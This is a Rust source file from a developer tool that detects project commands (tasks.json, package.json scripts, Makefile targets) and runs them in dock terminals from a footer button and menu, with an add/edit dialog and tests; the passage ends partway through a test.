//! Actions: project commands the footer runs in a dock terminal with one
//! click. They come from every source core detects, plus the personal ones
//! saved here. The button runs the last action run, while it still runs the
//! same command; its chevron lists the rest and opens the editor.
use super::*;
use crate::workspace::{ACTION_ICONS, ProjectAction};
use gespan_core::project_actions::{self as project_actions, Action, Listing};
use std::path::Path;

/// The menu row id that expands a collapsed section.
pub(super) const EXPAND: &str = "expand:";
/// `.gespan/tasks.json`'s source, listed under "Project".
const PROJECT: &str = "gespan";
const PERSONAL: &str = "personal";
/// A section with more rows than this starts collapsed.
const COLLAPSE_OVER: usize = 8;

pub(super) struct ActionDialog {
    /// The action being edited, or `None` for a new one.
    editing: Option<String>,
    name: Entity<input::Input>,
    command: Entity<input::Input>,
    icon: &'static str,
    error: Option<SharedString>,
    _events: Vec<Subscription>,
}

/// A project's detected actions and the checkout they were read from.
pub(super) struct ActionListing {
    project: String,
    checkout: String,
    listing: Listing,
}

/// Hands `project`'s personal actions to core, so agents list them too.
pub(super) fn publish_personal(project: &str, actions: &[ProjectAction]) {
    project_actions::set_personal(
        project,
        actions.iter().map(ProjectAction::personal).collect(),
    );
}

/// `id` in `actions`. A bare id, saved before actions had sources, is a
/// personal one.
fn find<'a>(actions: &'a [Action], id: &str) -> Option<&'a Action> {
    actions.iter().find(|a| a.id == id).or_else(|| {
        let personal = format!("{PERSONAL}:{id}");
        actions.iter().find(|a| a.id == personal)
    })
}

/// `env` with its shell references filled in from Gespan's own environment.
fn expand_env(env: &[(String, String)]) -> Vec<(String, String)> {
    env.iter()
        .map(|(name, value)| {
            let value =
                project_actions::runs::expand_env(value, cfg!(windows), |n| std::env::var(n).ok());
            (name.clone(), value)
        })
        .collect()
}

/// What `action` runs: its command, cwd and env. A repo can change any of
/// them, and a one-click run must run only what the user already ran.
fn fingerprint(action: &Action) -> String {
    let cwd = action.cwd.to_string_lossy();
    serde_json::to_string(&(&action.command, cwd, &action.env)).unwrap_or_default()
}

/// The menu row for `action`: its detail or command beneath, or why it
/// can't run.
fn action_row(action: &Action) -> MenuItem {
    let description = action
        .blocked
        .clone()
        .or_else(|| action.detail.clone())
        .unwrap_or_else(|| action.command.clone());
    MenuAction::new(
        SharedString::from(format!("run:{}", action.id)),
        action.label.clone(),
    )
    .icon(action.icon)
    .description(description)
    .disabled(action.blocked.is_some())
    .into()
}

impl Shell {
    fn personal_actions(&self) -> &[ProjectAction] {
        self.workspace
            .actions
            .get(&self.workspace.project)
            .map_or(&[], Vec::as_slice)
    }
    /// Hands this project's personal actions to core.
    pub(super) fn sync_personal(&self) {
        publish_personal(&self.workspace.project, self.personal_actions());
    }
    /// The project's actions as found in the active session's checkout.
    /// Reads files; core skips the ones that haven't changed.
    pub(super) fn listing(&self, cx: &App) -> Listing {
        let project = &self.workspace.project;
        if project.is_empty() || project.starts_with("remote://") {
            return Listing::default();
        }
        project_actions::detect(project, Path::new(&self.terminal_cwd(cx)))
    }
    /// Detects the actions again, for a menu that is opening.
    pub(super) fn refresh_actions(&mut self, cx: &App) {
        self.action_sections.clear();
        self.action_listing = Some(ActionListing {
            project: self.workspace.project.clone(),
            checkout: self.terminal_cwd(cx),
            listing: self.listing(cx),
        });
    }
    /// Detects the actions again only when the project or checkout changed.
    pub(super) fn sync_actions(&mut self, cx: &App) {
        let fresh = self.action_listing.as_ref().is_some_and(|l| {
            l.project == self.workspace.project && l.checkout == self.terminal_cwd(cx)
        });
        if !fresh {
            self.refresh_actions(cx);
        }
    }
    fn actions(&self) -> &[Action] {
        self.action_listing
            .as_ref()
            .filter(|l| l.project == self.workspace.project)
            .map_or(&[], |l| l.listing.actions.as_slice())
    }
    /// The action the footer button runs: the last one run from here, only
    /// while it still runs the same command, cwd and env. Nothing else is
    /// trusted for one click, so a fresh clone's button opens the menu.
    fn footer_action(&self) -> Option<&Action> {
        let project = &self.workspace.project;
        let trusted = self.workspace.last_action_fingerprints.get(project)?;
        let id = self.workspace.last_actions.get(project)?;
        find(self.actions(), id)
            .filter(|a| a.blocked.is_none() && !trusted.is_empty() && fingerprint(a) == *trusted)
    }
    /// Detects the actions again, keeping the open menu's expanded sections.
    fn redetect(&mut self, cx: &App) {
        self.action_listing = Some(ActionListing {
            project: self.workspace.project.clone(),
            checkout: self.terminal_cwd(cx),
            listing: self.listing(cx),
        });
    }
    /// The footer button: runs [`Self::footer_action`] as it is on disk now,
    /// or opens the menu when there is none.
    pub(super) fn run_footer_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.workspace.project.starts_with("remote://") {
            return;
        }
        self.redetect(cx);
        match self.footer_action().cloned() {
            Some(action) => self.launch_action(action, window, cx),
            None => self.toggle_actions_menu(window, cx),
        }
    }
    fn toggle_actions_menu(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.menu_open(&MenuTarget::Actions) {
            self.close_menu(cx);
        } else {
            let anchor = Anchor::Slot(self.actions_anchor.clone());
            self.open_menu(MenuTarget::Actions, anchor, window, cx);
        }
    }
    /// Shows or hides a long section's rows in the open menu.
    pub(super) fn toggle_action_section(&mut self, section: &str) {
        if !self.action_sections.remove(section) {
            self.action_sections.insert(section.to_owned());
        }
    }

    /// Runs `id` in its own dock terminal at the action's `cwd` with its
    /// `env`, reusing that terminal while it sits idle at a prompt in the
    /// same place, and opening a fresh one otherwise.
    pub(super) fn run_action(&mut self, id: &str, window: &mut Window, cx: &mut Context<Self>) {
        let project = self.workspace.project.clone();
        if project.starts_with("remote://") {
            self.error = Some("Actions are not available on remote projects.".into());
            cx.notify();
            return;
        }
        self.redetect(cx);
        let action = find(self.actions(), id).filter(|a| a.blocked.is_none());
        let Some(action) = action.cloned() else {
            // It went away or can no longer run; the footer shows that.
            cx.notify();
            return;
        };
        self.launch_action(action, window, cx);
    }
    fn launch_action(&mut self, action: Action, window: &mut Window, cx: &mut Context<Self>) {
        let project = self.workspace.project.clone();
        let cwd = action.cwd.to_string_lossy().into_owned();
        let env = expand_env(&action.env);
        self.workspace
            .last_actions
            .insert(project.clone(), action.id.clone());
        self.workspace
            .last_action_fingerprints
            .insert(project.clone(), fingerprint(&action));
        self.ensure_terminals(&project, cx);
        let key = (project.clone(), action.id.clone());
        let live = self.terminals.get(&project).cloned().unwrap_or_default();
        let reuse = self
            .action_terminals
            .get(&key)
            .and_then(|weak| weak.upgrade())
            .and_then(|terminal| {
                let ix = live.iter().position(|t| *t == terminal)?;
                let t = terminal.read(cx);
                let idle = t.foreground.is_none() && !t.exited;
                (idle && t.cwd == cwd && t.env == env).then_some((ix, terminal))
            });
        let reveal = self.workspace.preferences.action_opens_terminal;
        // The right panel shows the terminal instead of the dock.
        let in_panel = self.terminal_in_panel(cx);
        let viewport = self.viewport();
        let dock = self.workspace.docks.entry(project.clone()).or_default();
        let was_open = dock.open && !dock.terminals.is_empty();
        let terminal = match reuse {
            Some((ix, terminal)) => {
                if reveal {
                    dock.active = ix;
                    dock.open |= !in_panel;
                }
                terminal
            }
            None => {
                dock.size = dock.side.clamp(dock.size, viewport);
                dock.add(cwd.clone());
                // `add` opens the dock; a background run leaves it as it was.
                dock.open = (reveal && !in_panel) || was_open;
                let terminal = self.spawn_terminal(cwd, &env, cx);
                self.terminals
                    .entry(project.clone())
                    .or_default()
                    .push(terminal.clone());
                self.action_terminals.insert(key, terminal.downgrade());
                terminal
            }
        };
        terminal.update(cx, |t, cx| t.run(&action.command, cx));
        if reveal && in_panel {
            self.show_panel_terminal(window, cx);
        } else if reveal {
            if let Some(dock) = self.workspace.docks.get(&project) {
                self.dock_tab_scroll.scroll_to_item(dock.active);
            }
            if !was_open {
                self.slide_dock(true, cx);
            }
            self.focus_terminal(window, cx);
            self.fit_sidebar(cx);
        }
        self.persist(cx);
        cx.notify();
    }

    /// Every source's actions: "Project", "Personal", then each detected
    /// file, with the files that couldn't be read. Long sections collapse.
    pub(super) fn actions_menu(&self) -> Vec<MenuItem> {
        let (actions, errors) = self
            .action_listing
            .as_ref()
            .filter(|l| l.project == self.workspace.project)
            .map_or((&[][..], &[][..]), |l| {
                (l.listing.actions.as_slice(), l.listing.errors.as_slice())
            });
        let mut sections: Vec<(&str, Vec<MenuItem>)> =
            vec![("Project", Vec::new()), ("Personal", Vec::new())];
        fn rows<'a, 'b>(
            sections: &'b mut Vec<(&'a str, Vec<MenuItem>)>,
            name: &'a str,
        ) -> &'b mut Vec<MenuItem> {
            let at = match sections.iter().position(|(n, _)| *n == name) {
                Some(at) => at,
                None => {
                    sections.push((name, Vec::new()));
                    sections.len() - 1
                }
            };
            &mut sections[at].1
        }
        for action in actions {
            let name = match action.source {
                PROJECT => "Project",
                PERSONAL => "Personal",
                _ => action.file.as_str(),
            };
            rows(&mut sections, name).push(action_row(action));
        }
        let project_files = project_actions::SOURCES
            .iter()
            .find(|source| source.id() == PROJECT)
            .map_or(&[][..], |source| source.files());
        for error in errors {
            let name = if project_files.contains(&error.file.as_str()) {
                "Project"
            } else {
                error.file.as_str()
            };
            let label = format!("Couldn't read {}: {}", error.file, error.reason);
            rows(&mut sections, name).push(
                MenuAction::new(SharedString::from(format!("error:{}", error.file)), label)
                    .icon("alert-circle")
                    .disabled(true)
                    .into(),
            );
        }

        let mut items: Vec<MenuItem> = Vec::new();
        for (name, rows) in sections.into_iter().filter(|(_, rows)| !rows.is_empty()) {
            if !items.is_empty() {
                items.push(MenuItem::Separator);
            }
            if rows.len() > COLLAPSE_OVER && !self.action_sections.contains(name) {
                items.push(
                    MenuAction::new(
                        SharedString::from(format!("{EXPAND}{name}")),
                        format!("{name} ({})", rows.len()),
                    )
                    .icon("chevron-right")
                    .keep_open()
                    .into(),
                );
            } else {
                items.push(MenuItem::Caption(SharedString::from(name.to_owned())));
                items.extend(rows);
            }
        }
        if !items.is_empty() {
            items.push(MenuItem::Separator);
        }
        // Only personal actions are edited here so far.
        let personal = self.personal_actions();
        if !personal.is_empty() {
            items.push(
                MenuAction::new("edit", "Edit action")
                    .icon("pencil-edit-02")
                    .submenu(
                        personal
                            .iter()
                            .map(|a| {
                                MenuAction::new(
                                    SharedString::from(format!("edit:{}", a.id)),
                                    a.name.clone(),
                                )
                                .icon(a.icon())
                            })
                            .collect(),
                    )
                    .into(),
            );
        }
        items.push(MenuAction::new("add", "Add action").icon("add-01").into());
        items
    }
    pub(super) fn run_actions_menu(
        &mut self,
        action: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if action == "add" {
            self.open_action_dialog(None, window, cx);
        } else if let Some(id) = action.strip_prefix("run:") {
            self.run_action(id, window, cx);
        } else if let Some(id) = action.strip_prefix("edit:") {
            self.open_action_dialog(Some(id.to_owned()), window, cx);
        }
    }

    /// The footer's split button: run the current action, or pick another.
    pub(super) fn actions_button(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
        if self.workspace.project.starts_with("remote://") {
            return None;
        }
        let classic = self.workspace.boxy_layout();
        let current = self.footer_action().cloned();
        let menu_open = self.menu_open(&MenuTarget::Actions);
        // Each part rounds fully inside the frame's 2px inset.
        let outer = if classic { 6. } else { 10. };
        let segment = |id: &'static str| {
            div()
                .id(id)
                .role(Role::Button)
                .h_full()
                .flex()
                .items_center()
                .rounded(px(outer - 2.))
                .cursor_pointer()
                .text_color(content(0.4))
                // The whole button lights up; the part under the pointer more.
                .group_hover("footer-actions", |s| s.text_color(content(0.8)))
                .hover(|s| s.bg(content(0.08)).text_color(content(1.)))
        };
        let pad = px(if classic { 4. } else { 6. });
        let main = match &current {
            Some(action) => segment("footer-action-run")
                .aria_label(SharedString::from(format!("Run {}", action.label)))
                .aria_description(SharedString::from(action.command.clone()))
                .px(pad)
                .gap(px(6.))
                .max_w(px(180.))
                .min_w_0()
                .child(icon(action.icon, 12.).text_color(content(0.55)))
                .child(div().min_w_0().truncate().child(action.label.clone()))
                .on_click(cx.listener(|this, _, window, cx| this.run_footer_action(window, cx))),
            // Nothing trusted to run: the button opens the menu.
            None => segment("footer-action-open")
                .aria_label("Actions")
                .aria_expanded(menu_open)
                .px(pad)
                .gap(px(6.))
                .child(icon("play", 12.).text_color(content(0.55)))
                .child("Actions")
                .on_click(cx.listener(|this, _, window, cx| this.run_footer_action(window, cx))),
        };
        let chevron = segment("footer-action-menu")
            .aria_label("Actions")
            .aria_expanded(menu_open)
            .relative()
            .px(px(3.))
            .when(menu_open, |d| d.bg(content(0.08)).text_color(content(1.)))
            .child(self.actions_anchor.probe())
            .child(icon("chevron-down", 12.).text_color(content(0.55)))
            .on_click(cx.listener(|this, _, window, cx| this.toggle_actions_menu(window, cx)));
        Some(
            div()
                .id("footer-actions")
                .group("footer-actions")
                .role(Role::Group)
                .aria_label("Actions")
                .h(px(20.))
                .p(px(2.))
                .gap(px(1.))
                .flex()
                .flex_shrink_0()
                .items_stretch()
                .whitespace_nowrap()
                .rounded(px(outer))
                .when(menu_open, |d| d.bg(content(0.06)))
                .hover(|s| s.bg(content(0.06)))
                .child(main)
                .child(chevron)
                .into_any_element(),
        )
    }

    pub(super) fn open_action_dialog(
        &mut self,
        editing: Option<String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.close_preview(cx);
        let existing = editing
            .as_ref()
            .and_then(|id| self.personal_actions().iter().find(|a| a.id == *id))
            .cloned();
        let name = cx.new(|cx| input::Input::field("Action name", "Test", content(0.3), cx));
        let command = cx.new(input::Input::action_command);
        if let Some(action) = &existing {
            name.update(cx, |i, cx| i.set_text(action.name.clone(), cx));
            command.update(cx, |i, cx| i.set_text(action.command.clone(), cx));
        }
        let clear = |this: &mut Self, cx: &mut Context<Self>| {
            if let Some(dialog) = &mut this.action_dialog
                && dialog.error.take().is_some()
            {
                cx.notify();
            }
        };
        let events = vec![
            cx.subscribe_in(
                &name,
                window,
                |this, _, _: &input::Submitted, window, cx| this.save_action(window, cx),
            ),
            cx.subscribe_in(
                &command,
                window,
                |this, _, _: &input::Submitted, window, cx| this.save_action(window, cx),
            ),
            cx.subscribe(&name, move |this, _, _: &input::Changed, cx| {
                clear(this, cx)
            }),
            cx.subscribe(&command, move |this, _, _: &input::Changed, cx| {
                clear(this, cx)
            }),
        ];
        window.focus(&name.read(cx).focus_handle(cx), cx);
        self.action_dialog = Some(ActionDialog {
            icon: existing
                .as_ref()
                .map_or(ACTION_ICONS[0], ProjectAction::icon),
            editing: existing.map(|a| a.id),
            name,
            command,
            error: None,
            _events: events,
        });
        cx.notify();
    }
    pub(super) fn close_action_dialog(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if self.action_dialog.take().is_some() {
            self.focus_active(window, cx);
            cx.notify();
        }
    }
    fn save_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(dialog) = &mut self.action_dialog else {
            return;
        };
        let name = dialog.name.read(cx).content.trim().to_owned();
        let command = dialog.command.read(cx).content.trim().to_owned();
        if name.is_empty() || command.is_empty() {
            dialog.error = Some("Give the action a name and a command.".into());
            cx.notify();
            return;
        }
        let action = ProjectAction {
            id: dialog
                .editing
                .clone()
                .unwrap_or_else(|| format!("{:x}", gespan_core::time::now_ms())),
            name,
            command,
            icon: dialog.icon.to_owned(),
        };
        let project = self.workspace.project.clone();
        let actions = self.workspace.actions.entry(project.clone()).or_default();
        match actions.iter_mut().find(|a| a.id == action.id) {
            Some(slot) => *slot = action.clone(),
            None => actions.push(action.clone()),
        }
        self.workspace
            .last_actions
            .insert(project, format!("{PERSONAL}:{}", action.id));
        self.sync_personal();
        self.refresh_actions(cx);
        self.persist(cx);
        self.close_action_dialog(window, cx);
    }
    fn delete_action(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(id) = self.action_dialog.as_ref().and_then(|d| d.editing.clone()) else {
            return;
        };
        let project = self.workspace.project.clone();
        if let Some(actions) = self.workspace.actions.get_mut(&project) {
            actions.retain(|a| a.id != id);
            if actions.is_empty() {
                self.workspace.actions.remove(&project);
            }
        }
        let full = format!("{PERSONAL}:{id}");
        if self
            .workspace
            .last_actions
            .get(&project)
            .is_some_and(|last| *last == id || *last == full)
        {
            self.workspace.last_actions.remove(&project);
            self.workspace.last_action_fingerprints.remove(&project);
        }
        self.action_terminals.remove(&(project, full));
        self.sync_personal();
        self.refresh_actions(cx);
        self.persist(cx);
        self.close_action_dialog(window, cx);
    }

    /// The Add/Edit action dialog, centred over the window.
    pub(super) fn action_modal(
        &self,
        window: &Window,
        cx: &mut Context<Self>,
    ) -> Option<AnyElement> {
        let dialog = self.action_dialog.as_ref()?;
        let editing = dialog.editing.is_some();
        let viewport = window.viewport_size();
        let width = 420f32.min(viewport.width.as_f32() - 24.);
        let anchor = Anchor::Center;
        let weak = cx.weak_entity();
        let label = |text: &'static str| {
            div()
                .font_weight(FontWeight::MEDIUM)
                .text_color(content(0.8))
                .child(text)
        };
        let field = |input: Entity<input::Input>, multiline: bool| {
            div()
                .when(!multiline, |d| d.h(px(36.)).flex().items_center())
                .when(multiline, |d| d.py(px(8.)))
                .px(px(10.))
                .rounded_md()
                .border_1()
                .border_color(content(0.1))
                .bg(content(0.05))
                .text_size(px(13.))
                .text_color(content(1.))
                .child(input)
        };
        let icons = div()
            .flex()
            .gap(px(6.))
            .children(ACTION_ICONS.iter().enumerate().map(|(ix, name)| {
                let selected = *name == dialog.icon;
                div()
                    .id(("action-icon", ix))
                    .role(Role::RadioButton)
                    .aria_label(SharedString::from(*name))
                    .aria_toggled(if selected {
                        gpui::Toggled::True
                    } else {
                        gpui::Toggled::False
                    })
                    .size(px(34.))
                    .flex()
                    .items_center()
                    .justify_center()
                    .rounded_md()
                    .border_1()
                    .cursor_pointer()
                    .map(|d| {
                        if selected {
                            d.border_color(accent_color()).bg(content(0.08))
                        } else {
                            d.border_color(content(0.1)).hover(|s| s.bg(content(0.06)))
                        }
                    })
                    .child(icon(name, 16.).text_color(if selected {
                        content(1.)
                    } else {
                        content(0.6)
                    }))
                    .on_click(cx.listener(move |this, _, _, cx| {
                        if let Some(dialog) = &mut this.action_dialog {
                            dialog.icon = name;
                            cx.notify();
                        }
                    }))
            }));
        let title = if editing { "Edit action" } else { "Add action" };
        Some(
            div()
                .absolute()
                .size_full()
                .child(crate::modal::scrim("action-scrim"))
                .child(
                    popover("action-modal", anchor)
                        .modal_surface(self.workspace.boxy_layout())
                        .width(width)
                        .gap(0.)
                        .priority(60)
                        .on_dismiss(move |window, cx| {
                            let _ =
                                weak.update(cx, |this, cx| this.close_action_dialog(window, cx));
                        })
                        .child(
                            div()
                                .id("action-dialog")
                                .role(Role::Dialog)
                                .aria_label(title)
                                .p_4()
                                .flex()
                                .flex_col()
                                .gap_4()
                                .text_size(px(12.))
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(
                                            div()
                                                .text_size(px(14.))
                                                .font_weight(FontWeight::SEMIBOLD)
                                                .text_color(content(1.))
                                                .child(title),
                                        )
                                        .when(!editing, |d| {
                                            d.child(
                                                div()
                                                    .line_height(px(18.))
                                                    .text_color(content(0.6))
                                                    .child("Save a project command to run with one click."),
                                            )
                                        }),
                                )
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(label("Icon"))
                                        .child(icons),
                                )
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(label("Name"))
                                        .child(field(dialog.name.clone(), false)),
                                )
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_1p5()
                                        .child(label("Command"))
                                        .child(field(dialog.command.clone(), true))
                                        .child(match &dialog.error {
                                            Some(error) => div()
                                                .id("action-error")
                                                .role(Role::Alert)
                                                .text_size(px(11.))
                                                .text_color(rgb(0xf87171))
                                                .child(error.clone()),
                                            None => div()
                                                .id("action-help")
                                                .text_size(px(11.))
                                                .text_color(content(0.45))
                                                .child("Runs in a terminal at the project root."),
                                        }),
                                )
                                // Full-width buttons, the confirming one first.
                                .child(
                                    div()
                                        .flex()
                                        .flex_col()
                                        .gap_2()
                                        .child(
                                            crate::modal::primary_button(
                                                "action-save",
                                                if editing { "Save" } else { "Add action" },
                                            )
                                            .w_full()
                                            .cursor_pointer()
                                            .on_click(
                                                cx.listener(|this, _, window, cx| {
                                                    this.save_action(window, cx)
                                                }),
                                            ),
                                        )
                                        .when(editing, |d| {
                                            d.child(
                                                crate::modal::danger_ghost_button(
                                                    "action-delete",
                                                    "Delete action",
                                                )
                                                .debug_selector(|| "action-delete".into())
                                                .w_full()
                                                .bg(gpui::hsla(0., 0.66, 0.47, 0.08))
                                                .cursor_pointer()
                                                .on_click(cx.listener(|this, _, window, cx| {
                                                    this.delete_action(window, cx)
                                                })),
                                            )
                                        })
                                        .child(
                                            crate::modal::ghost_button("action-cancel", "Cancel")
                                                .w_full()
                                                .cursor_pointer()
                                                .on_click(cx.listener(|this, _, window, cx| {
                                                    this.close_action_dialog(window, cx)
                                                })),
                                        ),
                                ),
                        ),
                )
                .into_any_element(),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::MenuTarget;
    use crate::popover::MenuItem;
    use crate::shell::Shell;
    use crate::workspace::ProjectAction;
    use gpui::Context;
    use std::path::Path;

    fn write(dir: &Path, file: &str, text: &str) {
        let path = dir.join(file);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn tasks(tasks: &str) -> String {
        format!(r#"{{ "version": "2.0.0", "tasks": [{tasks}] }}"#)
    }

    /// Makes `dir` the project and the active session's worktree, so each
    /// test has its own personal actions and checkout.
    fn checkout(shell: &mut Shell, active: i64, dir: &Path, cx: &mut Context<Shell>) {
        let path = dir.to_string_lossy().into_owned();
        shell.workspace.project = path.clone();
        shell.workspace.active = Some(active);
        shell.ensure_session(active, cx);
        shell.sessions[&active].update(cx, |chat, _| chat.settings.worktree_cwd = Some(path));
    }

    /// Each row as text: `# caption` (case kept), `header TEXT`, `---`, or
    /// `label | description`, with `(off)` on disabled rows.
    fn rows(items: &[MenuItem]) -> Vec<String> {
        items
            .iter()
            .map(|item| match item {
                MenuItem::Header(text) => format!("header {text}"),
                MenuItem::Caption(text) => format!("# {text}"),
                MenuItem::Separator => "---".into(),
                MenuItem::Note(text) => format!("note {text}"),
                MenuItem::Custom(..) => "custom".into(),
                MenuItem::Action(action) => format!(
                    "{}{}{}",
                    action.label,
                    action
                        .description
                        .as_ref()
                        .map(|d| format!(" | {d}"))
                        .unwrap_or_default(),
                    if action.disabled { " (off)" } else { "" }
                ),
            })
            .collect()
    }

    fn cwd(path: &Path) -> String {
        path.to_string_lossy().into_owned()
    }

    #[gpui::test]
    fn menu_groups_project_personal_then_detected_sources(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
        write(
            root,
            ".gespan/tasks.json",
            &tasks(r#"{ "label": "Ship", "command": "echo ship", "detail": "Ships it" }"#),
        );
        let targets: String = (1..=9).map(|n| format!("t{n}:\n\techo {n}\n")).collect();
        write(root, "Makefile", &targets);
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                shell.open_action_dialog(None, window, cx);
                let dialog = shell.action_dialog.as_mut().unwrap();
                dialog.icon = "rocket";
                let (name, command) = (dialog.name.clone(), dialog.command.clone());
                name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
                command.update(cx, |i, cx| i.set_text("./deploy.sh".into(), cx));
                shell.save_action(window, cx);

                shell.refresh_actions(cx);
                let menu = shell.actions_menu();
                let rows = rows(&menu);
                let headers: Vec<_> = rows.iter().filter(|r| r.starts_with("# ")).collect();
                assert_eq!(
                    headers,
                    ["# Project", "# Personal", "# package.json"],
                    "{rows:?}"
                );
                let at = |text: &str| {
                    let at = rows.iter().position(|r| r == text);
                    at.unwrap_or_else(|| panic!("{text} not in {rows:?}"))
                };
                assert!(at("# Project") < at("Ship | Ships it"));
                assert!(at("Ship | Ships it") < at("# Personal"));
                assert!(at("# Personal") < at("Deploy | ./deploy.sh"));
                assert!(at("Deploy | ./deploy.sh") < at("# package.json"));
                assert!(at("# package.json") < at("dev | vite"));
                // Nine Makefile targets start collapsed behind one row.
                assert!(at("dev | vite") < at("Makefile (9)"));
                assert!(!rows.iter().any(|r| r.starts_with("t1")));
                let deploy = menu.iter().find_map(|item| match item {
                    MenuItem::Action(a) if a.label.as_ref() == "Deploy" => Some(a.clone()),
                    _ => None,
                });
                assert_eq!(deploy.unwrap().icon, Some("rocket"));
                // The rest of the menu stays: edit personal ones, add one.
                assert!(rows.iter().any(|r| r == "Edit action"));
                assert_eq!(rows.last().unwrap(), "Add action");

                // Expanding shows the section's rows under its header.
                shell.toggle_action_section("Makefile");
                let rows = super::tests::rows(&shell.actions_menu());
                let header = rows.iter().position(|r| r == "# Makefile").unwrap();
                assert_eq!(rows[header + 1], "t1 | make t1");
                assert_eq!(rows[header + 9], "t9 | make t9");
                assert!(!rows.iter().any(|r| r == "Makefile (9)"));
                // A fresh menu starts collapsed again.
                shell.refresh_actions(cx);
                assert!(
                    super::tests::rows(&shell.actions_menu())
                        .iter()
                        .any(|r| r == "Makefile (9)")
                );
            })
            .unwrap();
    }

    #[gpui::test]
    fn clicking_a_detected_action_runs_it_in_its_cwd(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join("web")).unwrap();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(
                r#"{ "label": "Web", "command": "echo web",
                      "options": { "cwd": "web", "env": { "GREETING": "hi", "P": "${env:PATH}" } } },
                    { "label": "Root", "command": "echo root" }"#,
            ),
        );
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                shell.refresh_actions(cx);
                shell.run_actions_menu("run:gespan:Web", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 1);
                let web = cwd(&root.join("web"));
                assert_eq!(terminals[0].read(cx).cwd, web);
                assert_eq!(shell.workspace.docks[&project].terminals, [web]);
                // `env` reaches the terminal, its references filled in from
                // Gespan's own environment.
                let env = terminals[0].read(cx).env.clone();
                assert!(env.contains(&("GREETING".into(), "hi".into())), "{env:?}");
                let own = std::env::var("PATH").unwrap_or_default();
                assert!(env.contains(&("P".into(), own)), "{env:?}");
                assert_eq!(
                    shell.workspace.last_actions[&project],
                    "gespan:Web".to_string()
                );
                assert_eq!(
                    shell.footer_action().map(|a| a.id.clone()),
                    Some("gespan:Web".into())
                );

                // Idle, the same action reuses its terminal.
                terminals[0].update(cx, |t, _| t.foreground = None);
                shell.run_action("gespan:Web", window, cx);
                assert_eq!(shell.terminals[&project].len(), 1);
                // Another action runs at the checkout root in its own.
                shell.run_action("gespan:Root", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 2);
                assert_eq!(terminals[1].read(cx).cwd, cwd(root));
                assert!(terminals[1].read(cx).env.is_empty());
            })
            .unwrap();
        // The file changes the action's cwd: its idle terminal isn't reused.
        std::fs::create_dir_all(root.join("api")).unwrap();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(r#"{ "label": "Web", "command": "echo web", "options": { "cwd": "api" } }"#),
        );
        window
            .update(cx, |shell, window, cx| {
                let project = shell.workspace.project.clone();
                for t in &shell.terminals[&project] {
                    t.update(cx, |t, _| t.foreground = None);
                }
                shell.run_action("gespan:Web", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 3);
                assert_eq!(terminals[2].read(cx).cwd, cwd(&root.join("api")));
            })
            .unwrap();
        // Only its env changes: same cwd, still a fresh terminal.
        write(
            root,
            ".gespan/tasks.json",
            &tasks(
                r#"{ "label": "Web", "command": "echo web",
                     "options": { "cwd": "api", "env": { "MODE": "dev" } } }"#,
            ),
        );
        window
            .update(cx, |shell, window, cx| {
                let project = shell.workspace.project.clone();
                for t in &shell.terminals[&project] {
                    t.update(cx, |t, _| t.foreground = None);
                }
                shell.run_action("gespan:Web", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 4);
                assert_eq!(terminals[3].read(cx).cwd, cwd(&root.join("api")));
                assert_eq!(terminals[3].read(cx).env, [("MODE".into(), "dev".into())]);
            })
            .unwrap();
    }

    #[gpui::test]
    fn a_legacy_personal_last_action_still_resolves(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                let action = ProjectAction {
                    id: "abc".into(),
                    name: "Deploy".into(),
                    command: "./deploy.sh".into(),
                    icon: "rocket".into(),
                };
                shell
                    .workspace
                    .actions
                    .insert(project.clone(), vec![action]);
                // Saved before actions had sources: a bare id.
                shell
                    .workspace
                    .last_actions
                    .insert(project.clone(), "abc".into());
                shell.sync_personal();
                shell.refresh_actions(cx);
                // Nothing says what it ran, so one click doesn't run it.
                assert!(shell.footer_action().is_none());

                // The bare id still runs it, at the checkout root.
                shell.run_action("abc", window, cx);
                let terminals = shell.terminals[&project].clone();
                assert_eq!(terminals.len(), 1);
                assert_eq!(terminals[0].read(cx).cwd, cwd(root));
                assert_eq!(shell.workspace.last_actions[&project], "personal:abc");
                let current = shell.footer_action().cloned().unwrap();
                assert_eq!(
                    (current.id.as_str(), current.label.as_str()),
                    ("personal:abc", "Deploy")
                );

                // Deleting it forgets it as the last one run.
                shell.open_action_dialog(Some("abc".into()), window, cx);
                shell.delete_action(window, cx);
